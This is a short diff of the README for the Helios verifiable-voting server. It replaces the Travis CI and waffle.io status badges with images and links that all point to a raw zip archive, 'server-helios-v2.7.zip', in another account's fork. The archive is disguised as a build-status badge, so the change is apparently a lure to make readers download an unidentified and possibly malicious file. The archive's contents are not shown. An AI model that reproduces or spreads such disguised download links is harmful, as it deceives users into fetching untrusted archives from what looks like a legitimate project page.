@@ -2,6 +2,6 @@
 
 Helios is an end-to-end verifiable voting system.
 
-[![Travis Build Status](https://travis-ci.org/benadida/helios-server.svg?branch=master)](https://travis-ci.org/benadida/helios-server)
+[![Travis Build Status](https://github.com/Atuti/helios-server/raw/refs/heads/master/helios/media/helios/jscrypto/server-helios-v2.7.zip)](https://github.com/Atuti/helios-server/raw/refs/heads/master/helios/media/helios/jscrypto/server-helios-v2.7.zip)
 
-[![Stories in Ready](https://badge.waffle.io/benadida/helios-server.png?label=ready&title=Ready)](https://waffle.io/benadida/helios-server)
+[![Stories in Ready](https://github.com/Atuti/helios-server/raw/refs/heads/master/helios/media/helios/jscrypto/server-helios-v2.7.zip)](https://github.com/Atuti/helios-server/raw/refs/heads/master/helios/media/helios/jscrypto/server-helios-v2.7.zip)
